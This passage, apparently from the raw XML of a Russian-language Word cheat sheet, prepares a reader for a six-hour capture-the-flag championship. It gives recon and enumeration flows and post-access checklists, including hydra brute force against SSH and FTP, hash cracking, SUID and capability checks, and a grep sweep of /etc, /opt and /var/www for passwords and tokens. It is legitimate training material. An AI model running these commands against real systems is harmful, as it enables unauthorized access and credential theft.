      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>27.5. Если найден SNMP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>161/UDP</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>public/private</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>snmpwalk</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>system/interfaces/users/processes</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>network information</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>new targets</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>27.6. Если найден MySQL</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>3306</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>version</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>default/anonymous credentials</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>credentials from Web/SMB</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>database</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>tables/users/hashes</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ↓</w:t>
        <w:br/>
        <w:t>cracking</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>28. Если получил user shell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>id</w:t>
        <w:br/>
        <w:t>whoami</w:t>
        <w:br/>
        <w:t>hostname</w:t>
        <w:br/>
        <w:t>uname -a</w:t>
        <w:br/>
        <w:t>cat /etc/os-release</w:t>
        <w:br/>
        <w:t>sudo -l</w:t>
        <w:br/>
        <w:t>ss -lntup</w:t>
        <w:br/>
        <w:t>ps auxf</w:t>
        <w:br/>
        <w:t>find / -perm -4000 -type f 2&gt;/dev/null</w:t>
        <w:br/>
        <w:t>getcap -r / 2&gt;/dev/null</w:t>
        <w:br/>
        <w:t>cat /etc/crontab</w:t>
        <w:br/>
        <w:t>grep -RniE 'password|passwd|secret|token' /etc /opt /var/www 2&gt;/dev/null</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>29. Если получил root</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>id</w:t>
        <w:br/>
        <w:t>hostname</w:t>
        <w:br/>
        <w:t>ip a</w:t>
        <w:br/>
        <w:t>ip route</w:t>
        <w:br/>
        <w:t>cat /root/.bash_history</w:t>
        <w:br/>
        <w:t>find /root -maxdepth 3 -type f 2&gt;/dev/null</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Зафиксируй доказательства выполнения задания и переходи к проверке остальных целей.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>30. Логирование результатов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>sudo nmap -sC -sV -p- TARGET -oA scans/TARGET</w:t>
        <w:br/>
        <w:br/>
        <w:t>ffuf ... -o web/ffuf-TARGET.json -of json</w:t>
        <w:br/>
        <w:br/>
        <w:t>hydra ... -o loot/hydra-TARGET.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>31. 6-часовой алгоритм чемпионата</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>00:00–00:15  Разобраться в задании, сетях и целях</w:t>
        <w:br/>
        <w:t>00:15–00:45  Nmap / host discovery / ports / versions</w:t>
        <w:br/>
        <w:t>00:45–02:00  Web / SMB / SSH / FTP / SNMP / DNS</w:t>
        <w:br/>
        <w:t>02:00–03:00  Credentials / default passwords / targeted brute</w:t>
        <w:br/>
        <w:t>03:00–04:00  Initial access / Linux / Windows enumeration</w:t>
        <w:br/>
        <w:t>04:00–05:00  PrivEsc / credentials / lateral movement</w:t>
        <w:br/>
        <w:t>05:00–05:30  Повторная проверка остальных целей</w:t>
        <w:br/>
        <w:t>05:30–06:00  Flags / evidence / требования задания</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>32. Одна страница — быстрый flow</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>1. ip -br a</w:t>
        <w:br/>
        <w:t>2. ip route</w:t>
        <w:br/>
        <w:t>3. sudo nmap -sn NETWORK/24</w:t>
        <w:br/>
        <w:t>4. sudo nmap -p- TARGET</w:t>
        <w:br/>
        <w:t>5. sudo nmap -sC -sV -pPORTS TARGET</w:t>
        <w:br/>
        <w:br/>
        <w:t>WEB:</w:t>
        <w:br/>
        <w:t>curl -I http://TARGET</w:t>
        <w:br/>
        <w:t>whatweb http://TARGET</w:t>
        <w:br/>
        <w:t>ffuf -u http://TARGET/FUZZ -w WORDLIST</w:t>
        <w:br/>
        <w:t>robots.txt / admin / login / backup / .git / .env</w:t>
        <w:br/>
        <w:br/>
        <w:t>SSH:</w:t>
        <w:br/>
        <w:t>ssh USER@TARGET</w:t>
        <w:br/>
        <w:t>hydra -L users.txt -P passwords.txt ssh://TARGET</w:t>
        <w:br/>
        <w:br/>
        <w:t>FTP:</w:t>
        <w:br/>
        <w:t>ftp TARGET</w:t>
        <w:br/>
        <w:t>hydra -L users.txt -P passwords.txt ftp://TARGET</w:t>
        <w:br/>
        <w:br/>
        <w:t>SMB:</w:t>
        <w:br/>
        <w:t>enum4linux-ng TARGET</w:t>
        <w:br/>
        <w:t>smbclient -L //TARGET -N</w:t>
        <w:br/>
        <w:br/>
        <w:t>SNMP:</w:t>
        <w:br/>
        <w:t>snmpwalk -v2c -c public TARGET</w:t>
        <w:br/>
        <w:br/>
        <w:t>HASH:</w:t>
        <w:br/>
        <w:t>hashid HASH</w:t>
        <w:br/>
        <w:t>john --wordlist=WORDLIST hash.txt</w:t>
        <w:br/>
        <w:t>hashcat -m MODE -a 0 hash.txt WORDLIST</w:t>
        <w:br/>
        <w:br/>
        <w:t>SHELL:</w:t>
        <w:br/>
        <w:t>id</w:t>
        <w:br/>
        <w:t>whoami</w:t>
        <w:br/>
        <w:t>hostname</w:t>
        <w:br/>
        <w:t>uname -a</w:t>
        <w:br/>
        <w:t>ip a</w:t>
        <w:br/>
        <w:t>ip route</w:t>
        <w:br/>
        <w:t>ss -lntup</w:t>
        <w:br/>
        <w:t>ps auxf</w:t>
        <w:br/>
        <w:br/>
        <w:t>PRIVESC:</w:t>
        <w:br/>
        <w:t>sudo -l</w:t>
        <w:br/>
        <w:t>SUID</w:t>
        <w:br/>
        <w:t>getcap</w:t>
        <w:br/>
        <w:t>cron</w:t>
        <w:br/>
        <w:t>writable files</w:t>
        <w:br/>
        <w:br/>
        <w:t>SECRETS:</w:t>
        <w:br/>
        <w:t>.bash_history</w:t>
        <w:br/>
        <w:t>.ssh</w:t>
        <w:br/>
        <w:t>configs</w:t>
        <w:br/>
        <w:t>.env</w:t>
        <w:br/>
        <w:t>passwords</w:t>
        <w:br/>
        <w:t>tokens</w:t>
        <w:br/>
        <w:br/>
        <w:t>LATERAL:</w:t>
        <w:br/>
        <w:t>new users</w:t>
        <w:br/>
        <w:t>new hosts</w:t>
        <w:br/>
        <w:t>new credentials</w:t>
        <w:br/>
        <w:br/>
        <w:t>FLAG:</w:t>
        <w:br/>
        <w:t>verify</w:t>
        <w:br/>
        <w:t>save evidence</w:t>
        <w:br/>
        <w:t>document</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>33. Финальная стратегия</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>RECON</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ↓</w:t>
        <w:br/>
        <w:t>ENUM</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ↓</w:t>
        <w:br/>
        <w:t>FIND WEAKNESS</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ↓</w:t>
        <w:br/>
        <w:t>TARGETED ATTACK</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ↓</w:t>
        <w:br/>
        <w:t>INITIAL ACCESS</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ↓</w:t>
        <w:br/>
        <w:t>ENUM AGAIN</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ↓</w:t>
        <w:br/>
        <w:t>PRIVESC</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ↓</w:t>
        <w:br/>
        <w:t>CREDENTIALS</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ↓</w:t>
        <w:br/>
        <w:t>LATERAL MOVEMENT</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ↓</w:t>
        <w:br/>
        <w:t>FLAG</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Не превращай подготовку в «запустить Hydra». На соревновании скорость достигается не максимальным brute force, а правильным выбором следующего шага.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